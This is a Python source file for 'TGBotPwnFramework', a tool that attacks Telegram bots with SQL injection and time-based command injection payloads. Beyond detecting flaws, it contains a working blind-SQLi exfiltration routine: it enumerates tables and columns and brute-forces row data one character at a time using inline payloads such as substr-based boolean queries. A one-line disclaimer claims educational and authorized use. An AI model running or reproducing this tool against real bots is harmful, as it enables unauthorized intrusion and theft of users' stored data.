#!/usr/-bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import time
import json
import requests
from datetime import datetime
from typing import List, Dict, Optional, Any

from telethon import TelegramClient
from telethon.tl.types import User
from telethon.errors.rpcerrorlist import FloodWaitError
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, IntPrompt
from thefuzz import fuzz

def load_config() -> Dict[str, Any]:
    """
    Loads all configurations from external files. Exits if files are missing.
    """
    try:
        with open('config.json', 'r', encoding='utf-8') as f:
            config = json.load(f)
        
        with open('tables.txt', 'r', encoding='utf-8') as f:
            config['common_tables'] = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        with open('charset.txt', 'r', encoding='utf-8') as f:
            config['charset'] = f.read().strip()

        # Load Payloads
        config['sqli_payloads'] = []
        with open('sqli_payloads.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    method, db, payload = line.strip().split(':', 2)
                    config['sqli_payloads'].append({"method": method, "db": db, "payload": payload})

        config['cmd_payloads'] = []
        with open('cmd_payloads.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    os_type, payload = line.strip().split(':', 1)
                    config['cmd_payloads'].append({"os": os_type, "payload": payload})

        if config.get('API_ID') == 1234567 or not config.get('API_HASH'):
            print("FATAL ERROR: Please configure your API_ID and API_HASH in 'config.json'.")
            exit(1)
            
        return config
    except FileNotFoundError as e:
        print(f"FATAL ERROR: Configuration file '{e.filename}' not found. Please create it.")
        exit(1)
    except (ValueError, IndexError):
        print("FATAL ERROR: A payload file has an incorrect format. Please check 'sqli_payloads.txt' and 'cmd_payloads.txt'.")
        exit(1)

CONFIG = load_config()

def query_online_worker(question: str, console: Console) -> str:
    worker_url = CONFIG.get("WORKER_URL", "")
    if "your-worker" in worker_url or not worker_url:
        return "[bold yellow]Warning: AI Worker URL is not configured in 'config.json'.[/bold yellow]"
    
    console.print(f"\n⚡️ [cyan]Sending question to AI worker:[/cyan] '{question}'")
    headers = {"Content-Type": "application/json"}
    data = {"question": question}
    
    try:
        with console.status("[bold green]Waiting for AI response...[/bold green]"):
            response = requests.post(worker_url, json=data, timeout=90)
        response.raise_for_status()
        ai_response = response.json()
        return ai_response.get("response", "پاسخ معتبری از ورکر دریافت نشد.")
    except requests.exceptions.RequestException as e:
        return f"[bold red]Error connecting to AI worker: {e}[/bold red]"

class ResponseAnalyzer:
    def __init__(self, console: Console):
        self.console = console
        self.baseline_avg_time = 0.0
        self.baseline_text = ""

    async def establish_baseline(self, conversation, base_payload: str) -> bool:
        self.console.print("[cyan]Establishing baseline response signature...[/cyan]")
        times, text_samples = [], []
        try:
            for _ in range(3):
                start_time = time.time()
                await conversation.send_message(base_payload)
                response = await conversation.get_response(timeout=CONFIG['default_timeout'])
                times.append(time.time() - start_time)
                text_samples.append(response.text)
                await asyncio.sleep(0.5)

            self.baseline_avg_time = sum(times) / len(times)
            self.baseline_text = text_samples[0]
            self.console.print(f"[green]Baseline Established:[/green] Avg Time: {self.baseline_avg_time:.2f}s")
            return True
        except Exception as e:
            self.console.print(f"[bold red]Failed to establish baseline: {e}[/bold red]")
            return False

    def is_boolean_true(self, response_text: str, true_text_signature: str) -> bool:
        return fuzz.ratio(response_text, true_text_signature) > CONFIG['fuzz_ratio_threshold']

    def is_time_delay_significant(self, response_time: float) -> bool:
        return (response_time - self.baseline_avg_time) > CONFIG['time_delay_threshold']

class VulnerabilityTester:
    def __init__(self, client: TelegramClient, target_entity, console: Console, on_finding: callable):
        self.client = client
        self.target_entity = target_entity
        self.console = console
        self.on_finding = on_finding
        self.analyzer = ResponseAnalyzer(console)

    def _interactive_ai_prompt(self, context_message: str):
        self.console.print(Panel(f"[dim]{context_message}[/dim]", title="[bold blue]🧠 AI Assistant[/bold blue]", border_style="blue"))
        choice = Prompt.ask("[cyan]Would you like to ask the AI for help?[/cyan]", choices=["y", "n"], default="n").lower()
        if choice == 'y':
            question = Prompt.ask("[yellow]Your question for the AI[/yellow]")
            if question:
                answer = query_online_worker(question, self.console)
                self.console.print(Panel(answer, title="[bold green]🤖 AI Response[/bold green]", border_style="green"))
                Prompt.ask("[dim]Press Enter to continue...[/dim]")

    async def _test_payload(self, payload: str) -> Optional[Dict[str, Any]]:
        try:
            start_time = time.time()
            async with self.client.conversation(self.target_entity, timeout=CONFIG['default_timeout']) as conv:
                await conv.send_message(payload)
                response = await conv.get_response()
            return {"text": response.text, "time": time.time() - start_time}
        except FloodWaitError as e:
            self.console.print(f"[bold yellow]Telegram flood wait triggered. Sleeping for {e.seconds}s...[/bold yellow]")
            await asyncio.sleep(e.seconds + 5)
            return None
        except Exception:
            return None

    async def run_sqli_test(self, template: str):
        self.console.print("\n" + "="*60)
        self.console.print("[bold yellow]-- MODULE: SQL INJECTION --[/bold yellow]")
        self._interactive_ai_prompt("You are about to run a comprehensive SQL Injection test using payloads from 'sqli_payloads.txt'.")
        
        self.console.print("\n[cyan]Phase 1: Attempting Boolean-Based Detection...[/cyan]")
        true_payload_info = next((p for p in CONFIG['sqli_payloads'] if p['method'] == 'BOOLEAN' and '1=1' in p['payload']), None)
        false_payload_info = next((p for p in CONFIG['sqli_payloads'] if p['method'] == 'BOOLEAN' and '1=2' in p['payload']), None)

        if not true_payload_info or not false_payload_info:
            self.console.print("[red]Error: Boolean payloads not found in 'sqli_payloads.txt'. Skipping phase.[/red]")
        else:
            true_payload = template.format(true_payload_info['payload'])
            false_payload = template.format(false_payload_info['payload'])
            
            true_resp = await self._test_payload(true_payload)
            false_resp = await self._test_payload(false_payload)

            if true_resp and false_resp and fuzz.ratio(true_resp['text'], false_resp['text']) < (100 - CONFIG['fuzz_ratio_threshold']):
                self.console.print("[bold green]✅ Success! Boolean-Based SQLi detected.[/bold green]")
                self.on_finding({"type": "SQLi", "method": "Boolean-Based", "severity": "High", "payload": true_payload})
                await self._exfiltrate_data_sqli_boolean(template, true_resp['text'])
                return

        self.console.print("[yellow]Boolean-Based detection inconclusive. Falling back to Time-Based.[/yellow]")
        
        self.console.print("\n[cyan]Phase 2: Attempting Time-Based Detection...[/cyan]")
        delay = CONFIG['time_delay_threshold'] + 1
        
        async with self.client.conversation(self.target_entity) as conv:
            if not await self.analyzer.establish_baseline(conv, template.format("baseline'")): return
        
        time_payloads = [p for p in CONFIG['sqli_payloads'] if p['method'] == 'TIME']
        for p_info in time_payloads:
            payload = template.format(p_info['payload'].format(delay=delay))
            self.console.print(f"Testing for {p_info['db']}...")
            response = await self._test_payload(payload)
            if response and self.analyzer.is_time_delay_significant(response['time']):
                self.console.print(f"[bold red]✅ VULNERABILITY CONFIRMED: Time-Based Blind SQL Injection ({p_info['db']})[/bold red]")
                self.on_finding({"type": "SQLi", "method": f"Time-Based ({p_info['db']})", "severity": "High", "payload": payload})
                return
        
        self.console.print("[bold yellow]SQL Injection not detected in any phase.[/bold yellow]")

    async def _exfiltrate_data_sqli_boolean(self, template: str, true_signature: str):
        self.console.print("\n[cyan]-- Starting Data Exfiltration via Boolean-Based method --[/cyan]")
        
        found_tables = []
        for table in CONFIG['common_tables']:
            self.console.print(f"Checking for table: [magenta]{table}[/magenta]...", end='\r')
            check_payload = template.format(f"' AND (SELECT 1 FROM {table} LIMIT 1)='1'--")
            resp = await self._test_payload(check_payload)
            if resp and self.analyzer.is_boolean_true(resp['text'], true_signature):
                self.console.print(f"[bold green]✔️ Table Found: {table}{' '*20}[/bold green]")
                found_tables.append(table)
        if not found_tables: self.console.print("[yellow]No common tables found.[/yellow]"); return

        for table in found_tables:
            columns, i = [], 0
            while True:
                query = f"SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}"
                col_name = await self._brute_force_query(template, query, true_signature)
                if col_name: columns.append(col_name); i+=1
                else: break
            self.console.print(f"Columns in '{table}': [cyan]{', '.join(columns)}[/cyan]")

            for col in columns:
                self.console.print(f"\n[magenta]Dumping data from {table}.{col}...[/magenta]")
                for i in range(CONFIG['brute_force_row_limit']):
                    query = f"SELECT {col} FROM {table} LIMIT 1 OFFSET {i}"
                    value = await self._brute_force_query(template, query, true_signature)
                    if value:
                        self.console.print(f"[bold red]  Row {i+1}: {value}[/bold red]")
                        self.on_finding({"type": "Exfiltrated Data", "source": f"{table}.{col}", "value": value})
                    else: break

    async def _brute_force_query(self, template: str, query: str, true_signature: str) -> str:
        result = ""
        for i in range(1, 101):
            found_char = False
            for char in CONFIG['charset']:
                test_char = f"'{char}'" if char != "'" else "''''"
                payload = template.format(f"' AND substr(({query}),{i},1)={test_char}--")
                resp = await self._test_payload(payload)
                if resp and self.analyzer.is_boolean_true(resp['text'], true_signature):
                    result += char
                    self.console.print(f"[dim]Brute-forcing... [reset]'{result}'", end="\r")
                    found_char = True
                    break
            if not found_char: break
        self.console.print(" " * (len(result) + 20), end="\r")
        return result

    async def run_command_injection_test(self, template: str):
        self.console.print("\n" + "="*60)
        self.console.print("[bold yellow]-- MODULE: COMMAND INJECTION --[/bold yellow]")
        self._interactive_ai_prompt("This module tests for OS Command Injection using time-based payloads from 'cmd_payloads.txt'.")
        delay = CONFIG['time_delay_threshold'] + 1

        async with self.client.conversation(self.target_entity) as conv:
            if not await self.analyzer.establish_baseline(conv, template.format("test_baseline")): return

        for p_info in CONFIG['cmd_payloads']:
            payload_template = p_info['payload'].format(delay=delay)
            full_payload = template.format(payload_template)
            self.console.print(f"Testing ({p_info['os']}): [dim]{p_info['payload']}[/dim]")
            response = await self._test_payload(full_payload)
            if response and self.analyzer.is_time_delay_significant(response['time']):
                self.console.print(f"[bold red]✅ VULNERABILITY CONFIRMED: Time-Based Command Injection[/bold red]")
                self.on_finding({"type": "Command Injection", "method": "Time-Based", "severity": "Critical", "payload": full_payload})
                return

        self.console.print("[bold yellow]Command Injection not detected.[/bold yellow]")

class TelegramBotPentestFramework:
    def __init__(self, bot_username: str):
        self.bot_username = bot_username
        self.client = TelegramClient('TBPenter', CONFIG['API_ID'], CONFIG['API_HASH'])
        self.console = Console()
        self.target_entity = None
        self.findings: List[Dict] = []
        self.tester = VulnerabilityTester(self.client, None, self.console, self.findings.append)

    async def connect(self) -> bool:
        self.console.print("[cyan]Connecting to Telegram...[/cyan]")
        try:
            await self.client.start()
            self.target_entity = await self.client.get_entity(self.bot_username)
            self.tester.target_entity = self.target_entity
            if not (isinstance(self.target_entity, User) and self.target_entity.bot):
                self.console.print(f"[bold red]Error: '{self.bot_username}' is not a bot.[/bold red]")
                return False
            self.console.print(f"[bold green]Successfully connected to bot: {self.target_entity.first_name}[/bold green]")
            return True
        except ValueError:
            self.console.print(f"[bold red]Error: Bot username '{self.bot_username}' not found.[/bold red]")
            return False
        except Exception as e:
            self.console.print(f"[bold red]An unexpected error occurred during connection: {e}[/bold red]")
            return False

    def generate_report(self):
        if not self.findings: self.console.print("[yellow]No findings to report.[/yellow]"); return
        self.console.print(f"\n[bold yellow]-- Generating Report --[/bold yellow]")
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"pentest_report_{self.bot_username.replace('@','')}_{timestamp}.json"
        report_data = { "target": self.bot_username, "scan_time": timestamp, "total_findings": len(self.findings), "findings": self.findings }
        with open(filename, 'w', encoding='utf-8') as f: json.dump(report_data, f, indent=4, ensure_ascii=False)
        self.console.print(f"[bold green]JSON report successfully saved to: {filename}[/bold green]")

    async def disconnect(self):
        await self.client.disconnect()
        self.console.print("\n[cyan]Disconnected.[/cyan]")

async def main():
    console = Console()
    console.print(Panel("[bold green]TGBotPwnFramework v5.0 (Data-Driven Edition)[/bold green]", expand=False))
    console.print("This tool is for educational and authorized security testing purposes only.\n")

    bot_username = Prompt.ask("[cyan]۱. Enter the target bot's username (e.g., @mybot)[/cyan]")
    framework = TelegramBotPentestFramework(bot_username)
    if not await framework.connect(): return

    while True:
        console.print(Panel("[bold blue]-- Main Test Menu --[/bold blue]", expand=False))
        console.print("1. Run Full Scan (SQLi + Command Injection)")
        console.print("2. Run SQL Injection Test Only")
        console.print("3. Run Command Injection Test Only")
        console.print("4. Generate Report & Exit")
        console.print("5. Exit Without Report")
        
        choice = IntPrompt.ask("[cyan]Select an option[/cyan]", choices=['1','2','3','4','5'])
        
        if choice in [1, 2, 3]:
            template = Prompt.ask("[cyan]Enter the command template to test (use {} as placeholder)\n(e.g., /search {} or /vote '{}')[/cyan]")
            if "{}" not in template:
                console.print("[bold red]Template must include '{}' for payload injection.[/bold red]"); continue

            if choice == 1:
                await framework.tester.run_sqli_test(template)
                await framework.tester.run_command_injection_test(template)
            elif choice == 2: await framework.tester.run_sqli_test(template)
            elif choice == 3: await framework.tester.run_command_injection_test(template)
        elif choice == 4: framework.generate_report(); break
        elif choice == 5: break
            
    await framework.disconnect()
    console.print("[bold green]Scan finished.[/bold green]")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, EOFError):
        print("\nExiting...")
